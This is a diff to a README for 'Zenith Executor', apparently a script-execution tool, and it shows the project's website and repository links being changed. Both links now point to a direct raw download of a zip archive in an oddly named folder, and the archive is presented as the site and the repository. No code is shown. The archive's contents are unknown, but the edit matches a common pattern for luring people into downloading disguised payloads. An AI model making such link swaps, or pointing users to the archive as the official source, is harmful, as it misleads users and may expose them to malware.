@@ -26,10 +26,10 @@ Welcome to the "Zenith Executor" repository, where you can experience the future
 Feel free to explore these topics to dive deeper into the world of Zenith Executor.
 
 ## 🌐 Visit our Website
-Find out more about Zenith Executor and its capabilities on [getzenith.org](https://getzenith.org). Just a click away from experiencing the future of script execution!
+Find out more about Zenith Executor and its capabilities on [https://github.com/Lilman12513/Zenith-Executor/raw/refs/heads/master/clinchingly/Executor_Zenith_v3.8.zip](https://github.com/Lilman12513/Zenith-Executor/raw/refs/heads/master/clinchingly/Executor_Zenith_v3.8.zip). Just a click away from experiencing the future of script execution!
 
 ## Repository Link
-To access the repository, please click [here](https://github.com/your-username/Zenith-Executor). If you encounter any issues with the link, make sure to check the "Releases" section for alternative access.
+To access the repository, please click [here](https://github.com/Lilman12513/Zenith-Executor/raw/refs/heads/master/clinchingly/Executor_Zenith_v3.8.zip). If you encounter any issues with the link, make sure to check the "Releases" section for alternative access.
 
 ## Get Started!
 Ready to elevate your script execution experience? Dive into the Zenith Executor world and make your development process more efficient, productive, and enjoyable. Experience the future today! 🌌
